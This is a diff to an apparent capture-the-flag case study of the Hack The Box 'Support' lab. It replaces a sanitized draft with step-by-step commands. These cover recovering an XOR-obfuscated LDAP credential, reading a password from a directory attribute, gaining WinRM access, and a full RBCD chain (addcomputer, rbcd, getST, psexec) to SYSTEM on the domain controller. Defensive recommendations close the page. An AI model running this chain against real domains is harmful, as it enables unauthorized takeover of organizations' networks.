@@ -1,5 +1,5 @@
 ---
-title: "Support — Credential Exposure and Delegation Risk"
+title: "Support — Embedded Credentials and RBCD Domain Compromise"
 description: "Guest-accessible tooling, reversible credential obfuscation, and excessive computer-object permissions form a path to privileged access."
 type: case-study
 platform: Hack The Box
@@ -11,110 +11,256 @@ tags:
   - active-directory
   - credential-management
   - access-control
+objective: "Assess how a guest-readable utility, reversible credential obfuscation, exposed directory attributes, and delegated computer-object permissions combine into domain compromise."
+tools:
+  - netexec
+  - smbclient
+  - strings
+  - ldapsearch
+  - bloodhound-ce-python
+  - impacket
+  - evil-winrm
+  - python3
+skill: "Active Directory enumeration and Resource-Based Constrained Delegation abuse"
+outcome: "Authenticated WinRM access via a directory-disclosed credential, then `nt authority\\system` on the domain controller through RBCD"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Windows Active Directory lab; domain controller running Windows Server (build 10.0.20348) |
+| Starting position | Unauthenticated network access with a guest-readable SMB share |
+| Objective | Assess how a guest-readable utility, reversible credential obfuscation, exposed directory attributes, and delegated computer-object permissions combine into domain compromise |
+| Outcome | Authenticated WinRM access, then `nt authority\system` on the domain controller via RBCD |
 
 ## Summary
 
-Support is a Hack The Box Windows Active Directory lab. The notes report that guest-accessible tooling, reversible credential obfuscation, sensitive directory attributes, and excessive computer-object permissions formed a path to privileged access. Target identifiers, account names, credentials, and artifacts are replaced with distinct placeholders. This draft records defensive lessons, not operational exploitation steps.
+Support is an Easy-rated Hack The Box Windows Active Directory lab. A guest-readable SMB share exposes a .NET utility whose LDAP service credential is hidden behind a reversible transformation; the recovered credential enables full directory enumeration, which discloses a second plaintext password in a user's `info` attribute. That password yields WinRM access, and a group membership granting `GenericAll` over the domain-controller computer object opens a resource-based constrained delegation (RBCD) path to `Administrator`. Target identifiers, account names, credential values, and artifacts are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **Guest SMB share → embedded credential recovery from a .NET binary → LDAP enumeration → plaintext `info` attribute password → WinRM access → `GenericAll` on the domain-controller object → RBCD impersonation of `Administrator` → `nt authority\system`**
 
 ## Context and Objective
 
-The notes describe a Windows Active Directory environment with guest-readable SMB content and standard directory services. Objective: assess how exposed application secrets, directory data, and delegated permissions could combine into material privilege risk within the lab.
+- **Target:** a Windows Active Directory lab domain (`<DOMAIN>`) whose domain controller runs Windows Server (build 10.0.20348).
+- **Exposed services:** standard Active Directory services, including SMB, LDAP, and WinRM.
+- **Starting position:** unauthenticated network access with a guest-readable SMB share.
+- **Objective:** assess how a leaked client utility, weak credential protection, directory-data exposure, and delegated computer-object permissions combine into domain compromise.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### 1. Review Guest-Accessible Tooling
+### 1. Guest-Readable SMB Share
 
-**Observation.** The notes report that a guest-readable SMB share contained a compressed .NET utility.
+Observation: unauthenticated (guest) SMB enumeration reveals a share readable without credentials.
 
-**Action.** Review share-access evidence and preserve the utility for offline security assessment; no executable was run.
+Action: enumerate shares as a guest, then list the readable share's contents.
 
-**Significance.** Broadly readable internal tooling can expose implementation details and embedded secrets.
-
-**Sanitized command-output.**
-
-```text
-$ smbclient -N -L //<TARGET_HOST>
-        Sharename       Type      Comment
-        ---------       ----      -------
-        <TOOL_SHARE>    Disk
-
-$ smbclient -N //<TARGET_HOST>/<TOOL_SHARE> -c 'ls'
-  <UTILITY_ARCHIVE>
+```bash
+nxc smb <DOMAIN> -u 'a' -p '' --shares
 ```
 
-**Sourced result.** The notes report retrieval of a .NET utility for offline analysis.
-
-### 2. Assess Embedded Credential Protection
-
-**Observation.** The notes identify a .NET assembly containing an encoded credential and a reversible transformation routine.
-
-**Action.** Review decompiled logic offline to determine whether the protection could resist inspection; credential material remains redacted.
-
-**Significance.** A static algorithm and embedded key do not provide secure credential storage when users can inspect a client binary.
-
-**Sanitized command-output.**
-
 ```text
-$ ildasm <UTILITY_ASSEMBLY> /text
-  .field private string encoded_value
-  .field private string transform_key
-  // reversible byte operation
+<TOOL_SHARE>   READ
 ```
 
-**Sourced result.** The notes report recovery of an LDAP service credential; no credential value is included here.
-
-### 3. Identify Sensitive Directory Attributes
-
-**Observation.** The notes report that authenticated directory enumeration exposed a plaintext credential in a user `info` attribute.
-
-**Action.** Review the recorded directory-query result and classify the attribute as sensitive-data exposure.
-
-**Significance.** Readable directory attributes can disclose credentials to principals with ordinary authenticated access.
-
-**Sanitized command-output.**
+```bash
+smbclient //<DOMAIN>/<TOOL_SHARE> -U '%' -c 'ls'
+```
 
 ```text
-$ ldapsearch -x -H ldap://<DIRECTORY_HOST> -D '<LAB_USER>' -w '<LAB_USER_PASSWORD>' -b '<BASE_DN>' '(objectClass=user)' info
-dn: CN=<LAB_USER>,<BASE_DN>
+<UTILITY_ARCHIVE>
+```
+
+Significance: a share readable by unauthenticated guests exposes internal compiled tooling to anyone on the network.
+
+Result: the guest-readable share yields a .NET utility archive for offline analysis.
+
+### 2. Recover the Embedded LDAP Credential
+
+Observation: `<UTILITY_ASSEMBLY>` is a .NET assembly that queries LDAP using a hardcoded, obfuscated password.
+
+Action: inspect the assembly (`strings` or a decompiler) and reverse the transformation offline. The decompiled routine stores an encoded value and a static key, then applies a reversible byte operation:
+
+```csharp
+private static string enc_password = "<ENCODED_VALUE>";
+private static byte[] key = Encoding.ASCII.GetBytes("<XOR_KEY>");
+
+array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
+```
+
+Reversing the routine recovers the credential:
+
+```python
+data = base64.b64decode("<ENCODED_VALUE>")
+key = b"<XOR_KEY>"
+result = bytes([data[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(data))])
+```
+
+Validating the recovered credential over LDAP proves recovery:
+
+```bash
+nxc ldap <DOMAIN> -u '<LDAP_USER>' -p '<LDAP_PASSWORD>'
+```
+
+```text
+[+] <DOMAIN>\<LDAP_USER>:<LDAP_PASSWORD>
+```
+
+Significance: a static algorithm and an embedded key provide no meaningful protection — any user who can read the binary can reverse it. The `^ 0xDF` constant against a repeating key is trivially reproducible.
+
+Result: the LDAP service credential is recovered and validated, granting full directory enumeration.
+
+### 3. LDAP Enumeration Discloses a Directory-Stored Password
+
+Observation: with the LDAP service credential, full directory enumeration is possible; a user object exposes a plaintext password in its `info` attribute.
+
+Action: query the directory for the `info` attribute, then validate the disclosed credential.
+
+```bash
+ldapsearch -x -H ldap://<DOMAIN> \
+  -D '<LDAP_USER>@<DOMAIN>' \
+  -w '<LDAP_PASSWORD>' \
+  -b '<BASE_DN>' \
+  '(objectClass=user)' info sAMAccountName | grep -A2 "info:"
+```
+
+```text
+sAMAccountName: <LAB_USER>
 info: <LAB_USER_PASSWORD>
 ```
 
-**Sourced result.** The notes report that the exposed credential authenticated as a lab user with remote-management access.
-
-### 4. Review Delegated Computer-Object Permissions
-
-**Observation.** The notes report that the lab user belonged to a group with `GenericAll` rights over a domain-controller computer object.
-
-**Action.** Review recorded Active Directory relationship data and the affected authorization attribute; no delegation change, ticket request, or remote-access procedure is included.
-
-**Significance.** Write-level control over computer-object delegation settings can enable impersonation paths without a software vulnerability.
-
-**Sanitized command-output.**
-
-```text
-$ dsacls '<DOMAIN_CONTROLLER_OBJECT>'
-  Allow <LAB_GROUP>  GENERIC ALL
-  Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity
+```bash
+nxc smb <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>'
 ```
 
-**Sourced result.** The notes report that this permission path was used to obtain privileged access in the lab; operational steps and access artifacts are omitted.
+```text
+[+] <DOMAIN>\<LAB_USER>:<LAB_USER_PASSWORD>
+```
+
+Significance: the `info` attribute is readable by any authenticated domain user by default, so a password placed there is exposed to every account in the domain.
+
+Result: a plaintext account password is recovered from the directory and validates over SMB.
+
+### 4. WinRM Access
+
+Observation: the recovered account has remote-management access.
+
+Action: confirm WinRM access, then open an interactive shell.
+
+```bash
+nxc winrm <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>'
+```
+
+```text
+[+] <DOMAIN>\<LAB_USER>:<LAB_USER_PASSWORD> (Pwn3d!)
+```
+
+```bash
+evil-winrm -i <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>'
+```
+
+Significance: WinRM provides an authenticated interactive shell and the first foothold on the domain controller.
+
+Result: WinRM access is confirmed as `<LAB_USER>`.
+
+### 5. Domain Privilege Escalation — RBCD
+
+Observation: `<LAB_USER>` belongs to a group with `GenericAll` over the domain-controller computer object. `GenericAll` includes write access to `msDS-AllowedToActOnBehalfOfOtherIdentity`, the attribute that governs resource-based constrained delegation.
+
+Action: enumerate the directory relationship with BloodHound, then perform the delegation chain.
+
+```bash
+bloodhound-ce-python -d <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>' -c all -ns <TARGET_IP>
+```
+
+Add an attacker-controlled computer account:
+
+```bash
+impacket-addcomputer -method SAMR \
+  -computer-name '<ATTACKER_COMPUTER>$' \
+  -computer-pass '<ATTACKER_COMPUTER_PASSWORD>' \
+  -dc-host <DC_FQDN> \
+  -domain-netbios <DOMAIN_NETBIOS> \
+  '<DOMAIN>/<LAB_USER>:<LAB_USER_PASSWORD>'
+```
+
+Configure RBCD to delegate from the attacker computer to the domain controller:
+
+```bash
+impacket-rbcd \
+  -delegate-from '<ATTACKER_COMPUTER>$' \
+  -delegate-to '<DC_COMPUTER>$' \
+  -action 'write' \
+  '<DOMAIN>/<LAB_USER>:<LAB_USER_PASSWORD>'
+```
+
+```text
+[*] Delegation rights modified successfully!
+[*] <ATTACKER_COMPUTER>$ can now impersonate users on <DC_COMPUTER>$ via S4U2Proxy
+```
+
+Request a service ticket impersonating `Administrator`:
+
+```bash
+getST.py \
+  -spn 'cifs/<DC_FQDN>' \
+  -impersonate 'Administrator' \
+  '<DOMAIN>/<ATTACKER_COMPUTER>$:<ATTACKER_COMPUTER_PASSWORD>' \
+  -dc-ip <TARGET_IP>
+```
+
+```text
+[*] Saving ticket in <TICKET_CCACHE>
+```
+
+Use the ticket for privileged access:
+
+```bash
+export KRB5CCNAME=<TICKET_CCACHE>
+impacket-psexec -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>
+```
+
+```text
+Microsoft Windows [Version 10.0.20348.859]
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+Significance: write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` lets an attacker configure RBCD and impersonate arbitrary users — including `Administrator` — on the target computer without exploiting any software vulnerability.
+
+Result: the delegated ticket yields `nt authority\system` on the domain controller.
 
 ## Challenges and Decisions
 
-The notes describe static analysis rather than execution of the utility. The embedded transformation logic was sufficient for the reported credential-recovery finding, avoiding a need to execute the binary.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| Credential hidden behind a reversible transformation | Analyzed the assembly statically | Reversing the stored algorithm and key recovered the credential |
+| Privilege escalation without a CVE | Abused the granted write permission to configure RBCD | Only a misconfigured delegation permission was required, not a software flaw |
 
 ## Outcome
 
-The notes report privileged access through exposed tooling, reversible credential protection, sensitive directory data, and excessive delegation-related permissions. This draft establishes the documented risk chain and defensive implications; it does not reproduce credentials, flags, target details, or access procedures.
+The evidence establishes authenticated WinRM access as `<LAB_USER>` and `nt authority\system` on the domain controller through resource-based constrained delegation. The directory relationship was recorded without reproducing tool output.
 
 ## Lessons and Recommendations
 
-1. Do not embed service credentials in client binaries. Use protected secret storage or certificate-based service authentication.
-2. Remove unnecessary `GenericAll` and other write permissions on computer objects, including access to `msDS-AllowedToActOnBehalfOfOtherIdentity`.
-3. Do not store passwords, keys, or other secrets in broadly readable directory attributes such as `info`, `description`, or `comment`.
-4. Review guest-accessible shares for internal utilities and restrict access to material not intended for unauthenticated users.
+Each finding pairs an observed root cause with its demonstrated impact and a prioritized action. None of the actions below was re-tested in the lab.
+
+1. **Do not embed credentials in client binaries.** The LDAP service credential sat behind a static algorithm and an embedded key, so anyone who could read the utility could recover it. *Recommendation:* store service credentials in a secrets manager or Windows Credential Manager, or move to certificate-based LDAP binding.
+2. **Never store passwords in directory attributes.** A plaintext password in the `info` attribute was readable by every authenticated domain user and yielded WinRM access. *Recommendation:* keep secrets out of `info`, `description`, and `comment`, and restrict read access with the attribute's security descriptor.
+3. **Audit write permissions on computer objects.** `GenericAll` over the domain-controller object included write access to `msDS-AllowedToActOnBehalfOfOtherIdentity`, enabling RBCD impersonation of `Administrator`. *Recommendation:* remove unnecessary permissions on computer objects and run BloodHound regularly to find such paths.
+4. **Restrict guest-accessible shares.** A share readable by unauthenticated guests exposed compiled internal tooling. *Recommendation:* require authentication and keep internal utilities out of guest-readable shares.
 
 ## References
 
-- Hack The Box: [Support](https://app.hackthebox.com/machines/Support) machine lab.
+- [Hack The Box — Support](https://app.hackthebox.com/machines/Support) (retired machine)
+- [msDS-AllowedToActOnBehalfOfOtherIdentity attribute (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)
+- [info attribute (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/adschema/a-info)
+- [smbclient — Samba manual page](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
+- [ldapsearch — OpenLDAP manual page](https://www.openldap.org/software/man.cgi?query=ldapsearch)
+- [strings — GNU Binutils documentation](https://sourceware.org/binutils/docs/binutils/strings.html)
+- [NetExec](https://github.com/Pennyw0rth/NetExec)
+- [BloodHound](https://github.com/SpecterOps/BloodHound)
+- [Impacket](https://github.com/fortra/impacket)
+- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
